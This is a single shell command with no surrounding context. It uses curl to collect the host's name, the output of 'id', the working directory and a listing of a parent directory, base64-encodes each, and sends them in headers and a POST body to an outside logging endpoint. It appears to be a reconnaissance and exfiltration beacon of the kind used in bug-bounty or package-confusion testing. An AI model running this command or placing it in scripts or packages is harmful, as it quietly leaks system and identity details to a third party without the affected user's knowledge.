curl -H "Hostname: $(hostname | base64)" -H "Whoami: $(id | base64)" -H "Pwd: $(pwd | base64)" -d "$(ls -al ../.. | base64)"  "https://d7.lc/sage_h1/logger.php"
